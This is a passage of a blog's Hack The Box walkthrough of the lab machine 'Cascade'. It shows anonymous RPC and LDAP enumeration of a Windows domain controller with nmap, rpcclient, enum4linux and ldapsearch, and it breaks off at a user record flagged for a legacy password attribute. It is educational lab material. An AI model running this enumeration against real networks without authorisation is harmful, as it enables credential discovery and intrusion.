<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Hack The Box - Cascade • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Cascade"/>
<meta name="twitter:description" content="Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted."/>

<meta property="og:title" content="Hack The Box - Cascade" />
<meta property="og:description" content="Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/cascade/" />
<meta property="article:published_time" content="2020-08-20T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-08-20T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haax9.github.io/en">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haax9.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/en/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/about/">
						<span>About</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/conferences/">
						<span>Conferences</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="https://cheatsheet.haax.fr">
						<span>Cheatsheet</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haax.fr/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/cascade/" hreflang="fr" lang="fr" class="langLink">Français</a>
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/cascade/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2023 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Cascade</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Aug 20, 2020
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 16 min read
</div>


  </header>
  <div class="post">
    <p>Cascade is a Windows machine considered easy/medium. An anonymous RPC access allows domain users enumeration and an anonymous search through LDAP allows to get a password using one account attribute. Then, the enumeration of SMB shares and available files reveals a VNC configuration file, giving another password once decrypted. The target account is used as a service and it is possible to get the binary. A fast reverse engineering gives the password through decryption function. Privilege escalation is done using a particular account that is supposed to be deleted.</p>
<p><strong>Disclaimer :</strong> It is a rather quick presentation that deliberately omits the various research areas. Only the actual results and a quick approach are presented. Furthermore, I didn&rsquo;t have lot of time to write and translate this write-up, so I used deepl.com translator for some parts ! I&rsquo;m sorry if the english is not that good ! :)</p>
<h2 id="discovery--enumeration">Discovery / Enumeration</h2>
<p>A quick port scan gives us running services on the machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.182 

Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.182
Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">9991</span> filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-04-11 12:42:51Z<span style="color:#f92672">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> SP2 or <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP0 or SP1, Windows Server <span style="color:#ae81ff">2008</span> SP1, or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP2, Windows <span style="color:#ae81ff">7</span> SP1, or Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Uptime guess: 0.009 days <span style="color:#f92672">(</span>since Sat Apr <span style="color:#ae81ff">11</span> 14:31:28 2020<span style="color:#f92672">)</span>
TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">251</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
IP ID Sequence Generation: Incremental
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m27s, deviation: 0s, median: 1m27s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-11 14:43:15
|_  start_date: 2020-04-11 14:33:30

NSE: Script Post-scanning.
Initiating NSE at 14:43
Completed NSE at 14:43, 0.00s elapsed
Initiating NSE at 14:43
Completed NSE at 14:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 541.01 seconds
           Raw packets sent: <span style="color:#ae81ff">30274</span> <span style="color:#f92672">(</span>1.336MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">242</span> <span style="color:#f92672">(</span>11.308KB<span style="color:#f92672">)</span>
</code></pre></div><p>Classic Windows machine ports are open. No exotic ones
<br/></p>
<h3 id="anonymous-bind--first-access">Anonymous bind &amp; first access</h3>
<p>First, we can try to log to RPC using anonymous bind and enumerate domain users.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.10.10.182
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
rpcclient $&gt; enumdomusers
user:<span style="color:#f92672">[</span>CascGuest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>arksvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x452<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>s.smith<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x453<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>r.thompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x455<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>util<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.wakefield<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45c<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>s.hickson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x461<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.goodhand<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x462<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>a.turnbull<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>e.crowe<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>b.hanson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>d.burman<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>BackupSvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.allen<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>i.croft<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
</code></pre></div><p>It works, so can automate the extraction of information using <code>enum4linux</code>. The output below is truncated to keep only some interesting parts. Since enumeration is one of the key phases in this type of exercise, we want to know users, groups and the relationships between them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ enum4linux 10.10.10.182

...

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting builtin group memberships:
Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\I</span>NTERACTIVE
Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Users
Group <span style="color:#e6db74">&#39;Guests&#39;</span> <span style="color:#f92672">(</span>RID: 546<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ascGuest
Group <span style="color:#e6db74">&#39;Guests&#39;</span> <span style="color:#f92672">(</span>RID: 546<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Guests
Group <span style="color:#e6db74">&#39;Pre-Windows 2000 Compatible Access&#39;</span> <span style="color:#f92672">(</span>RID: 554<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
Group <span style="color:#e6db74">&#39;Windows Authorization Access Group&#39;</span> <span style="color:#f92672">(</span>RID: 560<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\E</span>NTERPRISE DOMAIN CONTROLLERS

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting local groups:
group:<span style="color:#f92672">[</span>Cert Publishers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x205<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>RAS and IAS Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x229<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Allowed RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23b<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Denied RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23c<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>DnsAdmins<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44e<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>IT<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x459<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Production<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45a<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>HR<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45b<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>AD Recycle Bin<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45f<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Backup<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x460<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Temps<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>WinRMRemoteWMIUsers__<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Remote Management Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Factory<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Finance<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46d<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Audit Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Data Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting local group memberships:
Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\r</span>.thompson
Group <span style="color:#e6db74">&#39;HR&#39;</span> <span style="color:#f92672">(</span>RID: 1115<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.hickson
Group <span style="color:#e6db74">&#39;Data Share&#39;</span> <span style="color:#f92672">(</span>RID: 1138<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Users
Group <span style="color:#e6db74">&#39;Audit Share&#39;</span> <span style="color:#f92672">(</span>RID: 1137<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
Group <span style="color:#e6db74">&#39;Remote Management Users&#39;</span> <span style="color:#f92672">(</span>RID: 1126<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
Group <span style="color:#e6db74">&#39;Remote Management Users&#39;</span> <span style="color:#f92672">(</span>RID: 1126<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\k</span>rbtgt
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Controllers
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\S</span>chema Admins
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\E</span>nterprise Admins
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ert Publishers
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Admins
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\G</span>roup Policy Creator Owners
Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\R</span>ead-only Domain Controllers
Group <span style="color:#e6db74">&#39;AD Recycle Bin&#39;</span> <span style="color:#f92672">(</span>RID: 1119<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting domain groups:
group:<span style="color:#f92672">[</span>Enterprise Read-only Domain Controllers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f2<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Domain Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x201<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Domain Guests<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x202<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Domain Computers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x203<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Group Policy Creator Owners<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x208<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>DnsUpdateProxy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44f<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting domain group memberships:
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>dministrator
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\k</span>rbtgt
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\r</span>.thompson
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\u</span>til
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.wakefield
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.hickson
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.goodhand
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>.turnbull
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\e</span>.crowe
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\b</span>.hanson
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\d</span>.burman
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\B</span>ackupSvc
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.allen
Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\i</span>.croft
Group <span style="color:#e6db74">&#39;Group Policy Creator Owners&#39;</span> <span style="color:#f92672">(</span>RID: 520<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>dministrator
Group <span style="color:#e6db74">&#39;Domain Guests&#39;</span> <span style="color:#f92672">(</span>RID: 514<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ascGuest

...
</code></pre></div><p>We can also try enumeration through LDAP. Using this method, we can get more information such as some objects attributes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ldapsearch -x -h 10.10.10.182 -D <span style="color:#e6db74">&#39;&#39;</span> -w <span style="color:#e6db74">&#39;&#39;</span> -b <span style="color:#e6db74">&#34;DC=CASCADE,DC=LOCAL&#34;</span>
<span style="color:#75715e"># extended LDIF</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># LDAPv3</span>
<span style="color:#75715e"># base &lt;DC=CASCADE,DC=LOCAL&gt; with scope subtree</span>
<span style="color:#75715e"># filter: (objectclass=*)</span>
<span style="color:#75715e"># requesting: ALL</span>
<span style="color:#75715e">#</span>

<span style="color:#75715e"># cascade.local</span>
dn: DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
instanceType: <span style="color:#ae81ff">5</span>
whenCreated: 20200109153132.0Z
whenChanged: 20200411123320.0Z
subRefs: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
subRefs: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
subRefs: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
uSNCreated: <span style="color:#ae81ff">4099</span>
uSNChanged: <span style="color:#ae81ff">319567</span>
name: cascade
objectGUID:: BEPTb7rgSEuSvojkxZJmOA<span style="color:#f92672">==</span>
creationTime: <span style="color:#ae81ff">132310820004120279</span>
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: <span style="color:#ae81ff">0</span>
maxPwdAge: -9223372036854775808
minPwdAge: <span style="color:#ae81ff">0</span>
minPwdLength: <span style="color:#ae81ff">5</span>
modifiedCountAtLastProm: <span style="color:#ae81ff">0</span>
nextRid: <span style="color:#ae81ff">1001</span>
pwdProperties: <span style="color:#ae81ff">0</span>
pwdHistoryLength: <span style="color:#ae81ff">0</span>
objectSid:: AQQAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF
serverState: <span style="color:#ae81ff">1</span>
uASCompat: <span style="color:#ae81ff">1</span>
modifiedCount: <span style="color:#ae81ff">1</span>
auditingPolicy:: AAE<span style="color:#f92672">=</span>
nTMixedDomain: <span style="color:#ae81ff">0</span>
...
</code></pre></div><p>Interesting thing here is about <code>r.thompson</code>. Indeed, this one have a strange attribute called <code>cascadeLegacyPwd</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Ryan Thompson, Users, UK, cascade.local</span>
dn: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
objectClass: top
objectClass: person
